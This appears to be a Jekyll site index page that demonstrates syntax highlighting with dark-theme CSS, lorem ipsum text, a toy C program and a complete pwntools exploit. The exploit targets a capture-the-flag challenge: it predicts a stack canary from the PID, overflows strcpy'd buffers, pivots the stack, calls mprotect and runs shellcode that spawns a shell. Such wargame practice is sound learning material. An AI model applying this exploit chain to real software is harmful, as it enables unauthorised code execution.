---
layout: default
permalink: /index.html
---
<style>
*
{
    scrollbar-color: #202324 #454a4d;
}
body
{
    color: rgb(206, 202, 195);
    background-color: rgb(24, 26, 27);
}
footer
{
    visibility: hidden;
}
.page-header
{
    color: rgb(232, 230, 227);
    background-color: rgb(17, 122, 70);
    background-image: linear-gradient(120deg, rgb(17, 70, 122), rgb(17, 122, 70));
}
.main-content pre
{
    color: #729bae;
    background-color: rgb(29, 31, 32);
    border-color: rgb(35, 59, 82);
}
.highlight
{
    background-color: #181a1b;
}
table td
{
    padding: 0.5rem 1rem;
    border: 1px solid #1d1f20;
}
.highlight .o, .highlight .k, .highlight .kv
{
    color: rgb(142, 142, 142);
}
</style>

# Lorem
### Ipsum
Inventore doloremque eaque iusto et reiciendis vel provident rem. Eligendi qui iure assumenda et iusto placeat mollitia laudantium. Molestias cum dolores ut. Reiciendis ex quis sed provident velit labore magnam
{% highlight C linenos=table %}
#include <stdio.h>

typedef struct
{
    int x;
    int y;
} qwe;

int main(int argc, char** argv)
{
    char asd[][5] = { "Hola" };
    printf("%s %s\n", 0[asd], "mundo");
    qwe zxc;
    zxc.x = 1234;
    qwe* fgh = &zxc;
    fgh->y = 4321;
    printf("%i %i\n", zxc.x, zxc.y);
}
{% endhighlight %}

Un poco de python por aquí
{% highlight python %}
from pwn import *
import ctypes

s = ssh(host='pwn.w3challs.com',
        user='canary',
        password='canary',
        port=10101)
p = s.process("./canary")
# p = process("canary")
e = ELF("canary")

dist_canary_pwd  = 0x46
dist_canary_user = 0x27
dist_ebp         = 0x56


pid = pidof(p)[0]
libc = ctypes.cdll.LoadLibrary("libc.so.6")
libc.srand(pid)

canary = list(p32(libc.rand()))
asd = libc.rand() % 4
canary[asd] = 0
canary = bytearray(canary)

log.info("Canary: %08x | 0x%08x" % (int.from_bytes(canary, "big"), \
                                    int.from_bytes(canary, "little")))

# user is strcpy'd in second place, so it's used to set the null of the canary
# and the preceding bytes
user = b''
user += b"A" * dist_canary_user
user += canary[:asd]

# password is strcpy'd first, therefore it goes all the way in
pwd = b''
pwd += b"A" * (dist_canary_pwd + asd + 1) # write the second part of the canary
pwd += canary[asd + 1:]
pwd += b"A" * (dist_ebp - len(pwd))
# in the stack we can't put nullbytes (strcpy) but in .bss we're read with
# gets(), so here we have our nulls, let's pivote the stack there
delta = len(user) + len(pwd) + 8 + 1
pwd += p32(0x804a080 + delta - 4) # ebp
pwd += p32(0x80488fc) # leave;ret

payload = user + b':' + pwd
# read in 0x804a080 + delta, after user:pwd
payload2  = b''
payload2 += p32(e.plt['mprotect'])
payload2 += p32(0x08048af9) # pop;pop;pop;ret
payload2 += p32(0x804a000)
payload2 += p32(0x1000)
payload2 += p32(constants.PROT_EXEC | constants.PROT_READ | constants.PROT_WRITE)
payload2 += p32(0x804a080 + delta + 0x80)
payload2 += b"A" * (0x80 - len(payload2))
payload2 += asm(shellcraft.i386.linux.setreuid32(1026, 1026) + \
               shellcraft.i386.linux.sh())

p.writeline(payload + payload2)

p.interactive()
{% endhighlight %}
